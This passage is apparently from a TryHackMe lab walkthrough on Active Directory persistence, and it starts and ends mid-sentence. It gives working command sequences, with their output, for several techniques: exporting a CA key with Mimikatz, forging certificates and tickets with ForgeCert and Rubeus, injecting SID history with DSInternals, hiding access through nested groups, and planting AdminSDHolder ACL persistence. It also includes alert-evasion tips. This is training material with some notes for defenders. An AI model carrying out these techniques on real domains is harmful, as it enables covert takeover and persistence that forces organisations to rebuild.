protected through hardware-based protection methods such as an Hardware 
Security Module (HSM), which
 is often the case for organisations that just use Active Directory 
Certificate Services (AD CS) for 
internal purposes, it is protected by the machine Data Protection API 
(DPAPI). This means we 
can use tools such as Mimikatz and SharpDPAPI to extract the CA 
certificate and thus the private key from the CA. Mimikatz is the 
simplest tool to use, but if you want to experience other tools, have a 
look [here](https://pentestlab.blog/2021/11/15/golden-certificate/). Use SSH
 to authenticate to THMDC.za.tryhackme.loc using the Administrator 
credentials from Task 2, create a unique directory for your user, move 
to it, and load Mimikatz:

Terminal

```
za\administrator@DC C:\Users\Administrator.ZA>mkdir <username>
za\administrator@DC C:\Users\Administrator.ZA>cd <username>
za\administrator@DC C:\Users\Administrator.ZA\am0>C:\Tools\mimikatz_trunk\x64\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53  .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )   ## \ / ##       > https://blog.gentilkiwi.com/mimikatz '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz #
```

Let's first see if we can view the certificates stored on the DC:

Mimikatz Terminal

```
mimikatz # crypto::certificates /systemstore:local_machine * System Store  : 'local_machine' (0x00020000)
 * Store         : 'My'

 0.
    Subject  :
    Issuer   : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA
    Serial   : 040000000000703a4d78090a0ab10400000010
    Algorithm: 1.2.840.113549.1.1.1 (RSA)
    Validity : 4/27/2022 8:32:43 PM -> 4/27/2023 8:32:43 PM
    Hash SHA1: d6a84e153fa326554f095be4255460d5a6ce2b39
        Key Container  : dbe5782f91ce09a2ebc8e3bde464cc9b_32335b3b-2d6f-4ad7-a061-b862ac75bcb1
        Provider       : Microsoft RSA SChannel Cryptographic Provider
        Provider type  : RSA_SCHANNEL (12)
        Type           : AT_KEYEXCHANGE (0x00000001)
        |Provider name : Microsoft RSA SChannel Cryptographic Provider
        |Key Container : te-DomainControllerAuthentication-5ed52c94-34e8-4450-a751-a57ac55a110f
        |Unique name   : dbe5782f91ce09a2ebc8e3bde464cc9b_32335b3b-2d6f-4ad7-a061-b862ac75bcb1
        |Implementation: CRYPT_IMPL_SOFTWARE ;
        Algorithm      : CALG_RSA_KEYX
        Key size       : 2048 (0x00000800)
        Key permissions: 0000003b ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; )
        Exportable key : NO
[....]

```

We can see that there is a CA certificate on the DC.
 We can also note that some of these certificates were set not to allow 
us to export the key. Without this private key, we would not be able to 
generate new certificates. Luckily, Mimikatz allows us to patch memory 
to make these keys exportable:

Mimikatz Terminal

```
mimikatz # privilege::debugPrivilege '20' OK

mimikatz # crypto::capiLocal CryptoAPI RSACSP patched
Local CryptoAPI DSS CSP patched

mimikatz # crypto::cng"KeyIso" service patched

```

If
 you get an error, don't worry, it just means someone else executed the 
patch before you. With these services patched, we can use Mimikatz to 
export the certificates:

Mimikatz Terminal

```
mimikatz # crypto::certificates /systemstore:local_machine /export * System Store  : 'local_machine' (0x00020000)
 * Store         : 'My'

 0.
    Subject  :
    Issuer   : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA
    Serial   : 040000000000703a4d78090a0ab10400000010
    Algorithm: 1.2.840.113549.1.1.1 (RSA)
    Validity : 4/27/2022 8:32:43 PM -> 4/27/2023 8:32:43 PM
    Hash SHA1: d6a84e153fa326554f095be4255460d5a6ce2b39
        Key Container  : dbe5782f91ce09a2ebc8e3bde464cc9b_32335b3b-2d6f-4ad7-a061-b862ac75bcb1
        Provider       : Microsoft RSA SChannel Cryptographic Provider
        Provider type  : RSA_SCHANNEL (12)
        Type           : AT_KEYEXCHANGE (0x00000001)
        |Provider name : Microsoft RSA SChannel Cryptographic Provider
        |Key Container : te-DomainControllerAuthentication-5ed52c94-34e8-4450-a751-a57ac55a110f
        |Unique name   : dbe5782f91ce09a2ebc8e3bde464cc9b_32335b3b-2d6f-4ad7-a061-b862ac75bcb1
        |Implementation: CRYPT_IMPL_SOFTWARE ;
        Algorithm      : CALG_RSA_KEYX
        Key size       : 2048 (0x00000800)
        Key permissions: 0000003b ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; )
        Exportable key : NO
[....]

```

The exported certificates will be stored in both PFX and DER format to disk:

Terminal

```
za\administrator@THMDC C:\Users\Administrator.ZA\am0>dir
 Volume in drive C is Windows
 Volume Serial Number is 1634-22A9

 Directory of C:\Tools\x64

05/10/2022  12:12 PM    <DIR>          .
05/10/2022  12:12 PM    <DIR>          ..
05/10/2022  12:12 PM             1,423 local_machine_My_0_.der
05/10/2022  12:12 PM             3,299 local_machine_My_0_.pfx
05/10/2022  12:12 PM               939 local_machine_My_1_za-THMDC-CA.der
05/10/2022  12:12 PM             2,685 local_machine_My_1_za-THMDC-CA.pfx
05/10/2022  12:12 PM             1,534 local_machine_My_2_THMDC.za.tryhackme.loc.der
05/10/2022  12:12 PM             3,380 local_machine_My_2_THMDC.za.tryhackme.loc.pfx
05/10/2022  12:12 PM             1,465 local_machine_My_3_.der
05/10/2022  12:12 PM             3,321 local_machine_My_3_.pfx

```

The `za-THMDC-CA.pfx`
 certificate is the one we are particularly interested in. In order to 
export the private key, a password must be used to encrypt the 
certificate. By default, Mimikatz assigns the password of `mimikatz`.
 Download or copy this certificate to your AttackBox using SCP, and then
 copy it to your low-privileged user's home directory on THMWRK1. You 
can also perform the rest of the steps on your own non-domain-joined 
Windows machine if you prefer.

# Generating our own Certificates

Now that we have the private key and root CA certificate, we can use the SpectorOps [ForgeCert](https://github.com/GhostPack/ForgeCert)
 tool to forge a Client Authenticate certificate for any user we want. 
The ForgeCert and Rubeus binaries are stored in the C:\Tools\ directory 
on THMWRK1. Let's use ForgeCert to generate a new certificate:

Terminal

```
za\aaron.jones@THMWRK1 C:\Users\aaron.jones>C:\Tools\ForgeCert\ForgeCert.exe --CaCertPath za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword Password123
```

Parameters explained:

- **CaCertPath - The path to our exported CA certificate.**
- **CaCertPassword** - The password used to encrypt the certificate. By default, Mimikatz assigns the password of `mimikatz`.
- **Subject** - The subject or common name of the certificate. This does not really
matter in the context of what we will be using the certificate for.
- **SubjectAltName** - This is the User Principal Name (UPN) of the account we want to
impersonate with this certificate. It has to be a legitimate user.
- **NewCertPath** - The path to where ForgeCert will store the generated certificate.
- **NewCertPassword** - Since the certificate will require the private key exported for
authentication purposes, we must set a new password used to encrypt it.

We can use Rubeus to request a TGT using the certificate to verify that the certificate is trusted. We will use the following command:

`C:\Tools\Rubeus.exe
 asktgt /user:Administrator /enctype:aes256 /certificate:`

Let's break down the parameters:

- **/user** - This specifies the user that we will impersonate and has to match the UPN for the certificate we generated
- **/enctype** -This specifies the encryption type for the ticket. Setting this is
important for evasion, since the default encryption algorithm is weak,
which would result in an overpass-the-hash alert
- **/certificate** - Path to the certificate we have generated
- **/password** - The password for our certificate file
- **/outfile** - The file where our TGT will be output to
- **/domain** - The FQDN of the domain we are currently attacking
- **/dc** - The IP of the domain controller which we are requesting the TGT from. Usually, it is best to select a DC that has a CA service running

Once we execute the command, we should receive our TGT:

Terminal

```
za\aaron.jones@THMWRK1 C:\Users\aaron.jones>C:\Tools\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:vulncert.pfx /password:tryhackme /outfile:administrator.kirbi /domain:za.tryhackme.loc /dc:10.200.x.101
          ______        _
         (_____ \      | |
          _____) )_   _| |__  _____ _   _  ___
         |  __  /| | | |  _ \| ___ | | | |/___)
         | |  \ \| |_| | |_) ) ____| |_| |___ |
         |_|   |_|____/|____/|_____)____/(___/

         v2.0.0

       [*] Action: Ask TGT

       [*] Using PKINIT with etype aes256_cts_hmac_sha1 and subject: CN=vulncert
       [*] Building AS-REQ (w/ PKINIT preauth) for: 'za.tryhackme.loc\Administrator'
       [+] TGT request successful!
       [*] base64(ticket.kirbi):

             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

         ServiceName              :  krbtgt/za.tryhackme.loc
         ServiceRealm             :  za.tryhackme.loc
         UserName                 :  Administrator
         UserRealm                :  za.tryhackme.loc
         StartTime                :  2/6/2022 5:54:46 PM
         EndTime                  :  2/7/2022 3:54:46 AM
         RenewTill                :  2/13/2022 5:54:46 PM
         Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
         KeyType                  :  aes256_cts_hmac_sha1
         Base64(key)              :  Qr+FUX+/G2jHgAR2ssW11+lhaPlB6dMD8V5/rENwJVU=
         ASREP (key)              :  BF2483247FA4CB89DA0417DFEC7FC57C79170BAB55497E0C45F19D976FD617ED
```

Now we can use Mimikatz to load the

TGT

and authenticate to THMDC:

Terminal

```
za\aaron.jones@THMWRK1 C:\Users\aaron.jones>C:\Tools\mimikatz_trunk\x64\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \ / ##       > https://blog.gentilkiwi.com/mimikatz '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # kerberos::ptt administrator.kirbi

* File: 'administrator.kirbi': OK

mimikatz # exitBye!

za\aaron.jones@THMWRK1 C:\Users\aaron.jones>dir \\THMDC.za.tryhackme.loc\c$\
 Volume in drive \\THMDC.za.tryhackme.loc\c$ is Windows Volume Serial Number is 1634-22A9

 Directory of \\THMDC.za.tryhackme.loc\c$

01/04/2022  08:47 AM               103 delete-vagrant-user.ps1
04/30/2022  10:24 AM               154 dns_entries.csv
04/27/2022  10:53 PM           885,468 MzIzMzViM2ItMmQ2Zi00YWQ3LWEwNjEtYjg2MmFjNzViY2Ix.bin
09/15/2018  08:19 AM    <DIR>          PerfLogs
03/21/2020  09:31 PM    <DIR>          Program Files
03/21/2020  09:28 PM    <DIR>          Program Files (x86)
04/27/2022  08:27 AM             1,423 thm-network-setup-dc.ps1
04/25/2022  07:13 PM    <DIR>          tmp
04/27/2022  08:22 AM    <DIR>          Users
04/25/2022  07:11 PM    <SYMLINKD>     vagrant [\\vboxsvr\vagrant]
04/27/2022  08:12 PM    <DIR>          Windows
               7 File(s)      2,356,811 bytes
               7 Dir(s)  50,914,541,568 bytes free

```

# We Are No Longer Friends With The

Certificate
 persistence is significantly harder to defend against. Even if you 
rotate the credentials of the compromised account, the certificate will 
still be valid. The only way to remove the persistence is to issue a 
revocation of the certificate. However, this would only be possible if 
we generated the certificate through legitimate channels. Since we 
exported the CA and generated the certificate ourselves, it does not 
appear on AD CS's list of issued certificates, meaning the blue team will not be able to revoke our certificate.

So
 what's the only solution to remove the persistence? Well, this is why 
we are no longer friends. They will have to revoke the root CA 
certificate. But revoking this certificate means that all certificates 
issued by AD
 CS would all of a sudden be invalid. Meaning they will have to generate
 a new certificate for every system that uses AD CS. You should start to
 see why this type of persistence is incredibly dangerous and would 
require full rebuilds of systems if performed.

**Persistence through SID History**

The
 Security IDentifiers (SIDs) have been discussed before. But for a 
recap, SIDs are used to track the security principal and the account's 
access when connecting to resources. There is, however, an interesting 
attribute on accounts called the SID history.

The
 legitimate use case of SID history is to enable access for an account 
to effectively be cloned to another. This becomes useful when an 
organisation is busy performing an AD
 migration as it allows users to retain access to the original domain 
while they are being migrated to the new one. In the new domain, the 
user would have a new SID, but we can add the user's existing SID in the
 SID history, which will still allow them to access resources in the 
previous domain using their new account. While SID history is good for 
migrations, we, as attackers, can also abuse this feature for 
persistence.

# History Can Be Whatever We Want It To Be

The
 thing is, SID history is not restricted to only including SIDs from 
other domains. With the right permissions, we can just add a SID of our 
current domain to the SID history of an account we control. Some 
interesting notes about this persistence technique:

- We normally require Domain Admin privileges or the equivalent thereof to perform this attack.
- When the account creates a logon event, the SIDs associated with the account are added to the user's token, which then determines the privileges
associated with the account. This includes group SIDs.
- We can take this attack a step further if we inject the Enterprise Admin
SID since this would elevate the account's privileges to effective be
Domain Admin in all domains in the forest.
- Since the SIDs are added to the user's token, privileges would be respected
even if the account is not a member of the actual group. Making this a
very sneaky method of persistence. We have all the permissions we need
to compromise the entire domain (perhaps the entire forest), but our
account can simply be a normal user account with membership only to the
Domain Users group. We can up the sneakiness to another level by always
using this account to alter the SID history of another account, so the
initial persistence vector is not as easily discovered and remedied.

# Forging History

Get an SSH
 session on THMDC using the Administrator credentials for this next 
part. Before we forge SID history, let's just first get some information
 regarding the SIDs. Firstly, let's make sure that our low-privilege 
user does not currently have any information in their SID history:

Terminal

```markup
za\aaron.jones@THMCHILDDC C:\Users\Administrator.ZA>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator.ZA> Get-ADUser <your ad username> -properties sidhistory,memberof

DistinguishedName : CN=aaron.jones,OU=Consulting,OU=People,DC=za,DC=tryhackme,DC=loc
Enabled           : True
GivenName         : Aaron
MemberOf          : {CN=Internet Access,OU=Groups,DC=za,DC=tryhackme,DC=loc}
Name              : aaron.jones
ObjectClass       : user
ObjectGUID        : 7d4c08e5-05b6-45c4-920d-2a6dbba4ca22
SamAccountName    : aaron.jones
SID               : S-1-5-21-3885271727-2693558621-2658995185-1429
SIDHistory        : {}
Surname           : Jones
UserPrincipalName :
```

This
 confirms that our user does not currently have any SID History set. 
Let's get the SID of the Domain Admins group since this is the group we 
want to add to our SID History:

Terminal

```markup

PS C:\Users\Administrator.ZA> Get-ADGroup "Domain Admins"

DistinguishedName : CN=Domain Admins,CN=Users,DC=za,DC=tryhackme,DC=loc
GroupCategory     : Security
GroupScope        : Global
Name              : Domain Admins
ObjectClass       : group
ObjectGUID        : 3a8e1409-c578-45d1-9bb7-e15138f1a922
SamAccountName    : Domain Admins
SID               : S-1-5-21-3885271727-2693558621-2658995185-512
```

We
 could use something like Mimikatz to add SID history. However, the 
latest version of Mimikatz has a flaw that does not allow it to patch 
LSASS to update SID history. Hence we need to use something else. In 
this case, we will use the [DSInternals](https://github.com/MichaelGrafnetter/DSInternals) tools to directly patch the ntds.dit file, the AD database where all information is stored:

Terminal

```markup
PS C:\Users\Administrator.ZA>Stop-Service -Name ntds -force
PS C:\Users\Administrator.ZA> Add-ADDBSidHistory -SamAccountName 'username of our low-priveleged AD account' -SidHistory 'SID to add to SID History' -DatabasePath C:\Windows\NTDS\ntds.dit
PS C:\Users\Administrator.ZA>Start-Service -Name ntds
```

The
 NTDS database is locked when the NTDS service is running. In order to 
patch our SID history, we must first stop the service. **You must restart the NTDS service after the patch, otherwise, authentication for the entire network will not work anymore.**

After these steps have been performed, let's SSH
 into THMWRK1 with our low-privileged credentials and verify that the 
SID history was added and that we now have Domain Admin privileges:

Terminal

```markup
za\aaron.jones@THMWRK1 C:\Users\aaron.jones>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\aaron.jones> Get-ADUser aaron.jones -Properties sidhistory

DistinguishedName : CN=aaron.jones,OU=Consulting,OU=People,DC=za,DC=tryhackme,DC=loc
Enabled : True
GivenName : Aaron
Name : aaron.jones
ObjectClass : user
ObjectGUID : 7d4c08e5-05b6-45c4-920d-2a6dbba4ca22
SamAccountName : aaron.jones
SIDHistory : {S-1-5-21-3885271727-2693558621-2658995185-512}
Surname : Jones
UserPrincipalName :

PS C:\Users\aaron.jones> dir \\thmdc.za.tryhackme.loc\c$

Directory: \\thmdc.za.tryhackme.loc\c$

Mode LastWriteTime Length Name
---- ------------- ------ ----
d----- 9/15/2018 8:19 AM PerfLogs
d-r--- 5/11/2022 10:32 AM Program Files
d----- 3/21/2020 8:28 PM Program Files (x86)
d----- 4/25/2022 7:13 PM tmp
da---- 5/11/2022 10:11 AM Tools
d-r--- 4/27/2022 8:22 AM Users
d----l 4/25/2022 7:11 PM vagrant
d----- 4/27/2022 8:12 PM Windows
-a---- 1/4/2022 7:47 AM 103 delete-vagrant-user.ps1
-a---- 5/1/2022 9:11 AM 169 dns_entries.csv
-a---- 5/1/2022 9:17 AM 1725 thm-network-setup-dc.ps1
```

Based on the output above, that worked! We were able to forge our SID History, granting our low-privileged account DA access!

# Pitchforks and Torches from the

If you were to RDP
 into one of the hosts and use the AD Users and Groups snap-in, you 
would be able to view the SID history attribute added to your user. 
However, even with the highest possible privileges, you would not be 
able to remove the attribute since it is protected. In order to remove 
this, you would have to use tools such as the AD-RSAT PowerShell cmdlets
 to remove SID history.

However, before you can even think 
about removing malicious SID history attributes, you first need to find 
them. None of the regular tools will tell you that something is wrong. 
That user will not all of a sudden pop up as a member of the Domain 
Admins group. So unless you are actively filtering through the 
attributes of your users, this is incredibly hard to find. This is 
because the SID history is only applied and used once the user 
authenticates.

Imagine that you are the blue team dealing with an 
incident where you have just performed a domain takeback. You rotated 
the krbtgt account's password twice, removed golden and silver tickets, 
and rebuilt your entire CA server from scratch, just to see that the 
attacker is still performing DA commands with a low-privileged account. 
This would not be a great day.

**Persistence through Group Membership**

If we don't want to tamper with SID histories, we can just add ourselves directly to AD
 groups for persistence. While SID history is a great persistence 
technique, credential rotation and cleanup can still remove our 
persistence. In certain cases, it may be better to perform persistence 
by targeting the AD groups themselves.

# Persistence

As
 discussed in task 1, the most privileged account, or group, is not 
always the best to use for persistence. Privileged groups are monitored 
more closely for changes than others. Any group that classifies as a 
protected group, such as Domain Admins or Enterprise Admins, receive 
additional security scrutiny. So if we want to persist through group 
membership, we may need to get creative regarding the groups we add our 
own accounts to for persistence:

- The IT Support group can be
used to gain privileges such as force changing user passwords. Although, in most cases, we won't be able to reset the passwords of privileged
users, having the ability to reset even low-privileged users can allow
us to spread to workstations.
- Groups that provide local
administrator rights are often not monitored as closely as protected
groups. With local administrator rights to the correct hosts through
group membership of a network support group, we may have good
persistence that can be used to compromise the domain again.
- It
is not always about direct privileges. Sometimes groups with indirect
privileges, such as ownership over Group Policy Objects (GPOs), can be
just as good for persistence.

# Nested Groups

In
 most organisations, there are a significant amount of recursive groups.
 A recursive group is a group that is a member of another group. We can 
think of this as group nesting. Group nesting is used to create a more 
organised structure in AD.
 Take the IT Support group, for example. IT Support is very generic. So 
perhaps there are subgroups like Helpdesk, Access Card Managers, and 
Network Managers underneath this group. We can add all of these groups 
as members to the IT Support group, which gives all users in these 
subgroups the permissions and privileges associated with the IT Support 
group, but we can then assign more granular permissions and privileges 
for each of the subgroups.

While group nesting helps to organise AD,
 it does reduce the visibility of effective access. Take our IT Support 
example again. If we query AD for membership of the IT Support group, it
 would respond with a count of three. However, this count is not really 
true since it is three groups. To get an idea for effective access, we 
would now have to enumerate those subgroups as well. But those subgroups
 can also have subgroups. So the question becomes: "How many layers deep
 should we enumerate to get the real effective access number?"

This
 also becomes a monitoring problem. Let's say, for instance, we have an 
alert that fires off when a new member is added to the Domain Admins 
group. That is a good alert to have, but it won't fire off if a user is 
added to a subgroup within the Domain Admins group. This is a very 
common problem since AD
 is managed by the AD team, and alerting and monitoring are managed by 
the InfoSec team. All we need is a little bit of miscommunication, and 
the alert is no longer valid since subgroups are used.

As
 an attacker, we can leverage this reduced visibility to perform 
persistence. Instead of targeting the privileged groups that would 
provide us with access to the environment, we focus our attention on the
 subgroups instead. Rather than adding ourselves to a privileged group 
that would raise an alert, we add ourselves to a subgroup that is not 
being monitored.

# Nesting Our

Let's
 simulate this type of persistence. In order to allow other users also 
to perform the technique, make sure to prepend your username to all the 
groups that you create. In order to simulate the persistence, we will 
create some of our own groups. Let's start by creating a new base group 
that we will hide in the People->IT Organisational Unit (OU):

Terminal

```markup
PS C:\Users\Administrator.ZA>New-ADGroup -Path "OU=IT,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 1" -SamAccountName "<username>_nestgroup1" -DisplayName "<username> Nest Group 1" -GroupScope Global -GroupCategory Security
```

Let's now create another group in the People->Sales OU and add our previous group as a member:

Terminal

```markup
PS C:\Users\Administrator.ZA>New-ADGroup -Path "OU=SALES,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 2" -SamAccountName "<username>_nestgroup2" -DisplayName "<username> Nest Group 2" -GroupScope Global -GroupCategory Security
PS C:\Users\Administrator.ZA>Add-ADGroupMember -Identity "<username>_nestgroup2" -Members "<username>_nestgroup1"
```

We can do this a couple more times, every time adding the previous group as a member:

Terminal

```markup
PS C:\Users\Administrator.ZA> New-ADGroup -Path "OU=CONSULTING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 3" -SamAccountName "<username>_nestgroup3" -DisplayName "<username> Nest Group 3" -GroupScope Global -GroupCategory Security
PS C:\Users\Administrator.ZA> Add-ADGroupMember -Identity "<username>_nestgroup3" -Members "<username>_nestgroup2"
PS C:\Users\Administrator.ZA> New-ADGroup -Path "OU=MARKETING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 4" -SamAccountName "<username>_nestgroup4" -DisplayName "<username> Nest Group 4" -GroupScope Global -GroupCategory Security
PS C:\Users\Administrator.ZA> Add-ADGroupMember -Identity "<username>_nestgroup4" -Members "<username>_nestgroup3"
PS C:\Users\Administrator.ZA> New-ADGroup -Path "OU=IT,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 5" -SamAccountName "<username>_nestgroup5" -DisplayName "<username> Nest Group 5" -GroupScope Global -GroupCategory Security
PS C:\Users\Administrator.ZA> Add-ADGroupMember -Identity "<username>_nestgroup5" -Members "<username>_nestgroup4"
```

With the last group, let's now add that group to the Domain Admins group:

Terminal

```markup
PS C:\Users\Administrator.ZA>Add-ADGroupMember -Identity "Domain Admins" -Members "<username>_nestgroup5"
```

Lastly, let's add our low-privileged AD user to the first group we created:

Terminal

```markup
PS C:\Users\Administrator.ZA>Add-ADGroupMember -Identity "<username>_nestgroup1" -Members "<low privileged username>"
```

Instantly, your low-privileged user should now have privileged access to THMDC. Let's verify this by using our SSH terminal on THMWRK1:

Terminal

```markup
za\aaron.jones@THMWRK1 C:\Users\aaron.jones>dir \\thmdc.za.tryhackme.loc\c$\
 Volume in drive \\thmdc.za.tryhackme.loc\c$ is Windows
 Volume Serial Number is 1634-22A9

 Directory of \\thmdc.za.tryhackme.loc\c$

01/04/2022  08:47 AM               103 delete-vagrant-user.ps1
05/01/2022  09:11 AM               169 dns_entries.csv
09/15/2018  08:19 AM    <DIR>          PerfLogs
05/11/2022  10:32 AM    <DIR>          Program Files
03/21/2020  09:28 PM    <DIR>          Program Files (x86)
05/01/2022  09:17 AM             1,725 thm-network-setup-dc.ps1
04/25/2022  07:13 PM    <DIR>          tmp
05/15/2022  09:16 PM    <DIR>          Tools
04/27/2022  08:22 AM    <DIR>          Users
04/25/2022  07:11 PM    <SYMLINKD>     vagrant [\\vboxsvr\vagrant]
04/27/2022  08:12 PM    <DIR>          Windows
               3 File(s)          1,997 bytes
               8 Dir(s)  51,573,755,904 bytes free
```

Let's also verify that even though we created multiple groups, the Domain Admins group only has one new member:

Terminal

```markup
PS C:\Users\Administrator.ZA> Get-ADGroupMember -Identity "Domain Admins"

distinguishedName : CN=Administrator,CN=Users,DC=za,DC=tryhackme,DC=loc
name              : Administrator
objectClass       : user
objectGUID        : 0bbd7980-b53b-4634-8a28-57e4234655c2
SamAccountName    : Administrator
SID               : S-1-5-21-3885271727-2693558621-2658995185-500

distinguishedName : CN=Am0 Net Group 5,OU=IT,OU=People,DC=za,DC=tryhackme,DC=loc
name              : Am0 Net Group 5
objectClass       : group
objectGUID        : ba545574-6af9-4a3d-a8df-24ab582fc04c
SamAccountName    : am0_nestgroup5
SID               : S-1-5-21-3885271727-2693558621-2658995185-6163
```

# Annoying More Than Just The

If
 this was a real organisation, we would not be creating new groups to 
nest. Instead, we would make use of the existing groups to perform 
nesting. However, this is something you would never do on a normal red 
team assessment and almost always dechain at this point since it breaks 
the organisation's AD
 structure, and if we sufficiently break it, they would not be able to 
recover. At this point, even if the blue team was able to kick us out, 
the organisation would more than likely still have to rebuild their 
entire AD structure from scratch, resulting in significant damages.

**Persistence through ACLs**

Sometimes, we need more than just persisting to normal AD groups. What if we want to persist to all protected 
groups simultaneously?

# Persisting through Group Templates

While
 we can just add an account we control to every single privileged group 
we can find, the blue team would still be able to perform cleanup and 
remove our membership. In order to ensure a bit better persistence and 
make the blue team scratch their heads, we should rather inject into the
 templates that generate the default groups. By injecting into these 
templates, even if they remove our membership, we just need to wait 
until the template refreshes, and we will once again be granted 
membership.

One such template is the AdminSDHolder container. This
 container exists in every AD domain, and its Access Control List (ACL) 
is used as a template to copy permissions to all protected groups. 
Protected groups include privileged groups such as Domain Admins, 
Administrators, Enterprise Admins, and Schema Admins. If you are looking
 for the full list of groups, you can find them [here](https://docs.microsoft.com/en-us/previous-versions/technet-magazine/ee361593(v=msdn.10)).

A
 process called SDProp takes the ACL of the AdminSDHolder container and
 applies it to all protected groups every 60 minutes. We can thus write 
an ACE that will grant us full permissions on all protected groups. If 
the blue team is not aware that this type of persistence is being used, 
it will be quite frustrating. Every time they remove the 
inappropriate permission on the protected object or group, it reappears 
within the hour. Since this reconstruction occurs through 
normal AD processes, it would also not show any alert to the blue
 team, making it harder to pinpoint the source of the persistence.

# Persisting with AdminSDHolder

In
 order to deploy our persistence to the AdminSDHolder, we will use 
Microsoft Management Console (MMC). To avoid kicking users out of their

RDP

sessions, it will be best to RDP into THMWRK1 using your low privileged
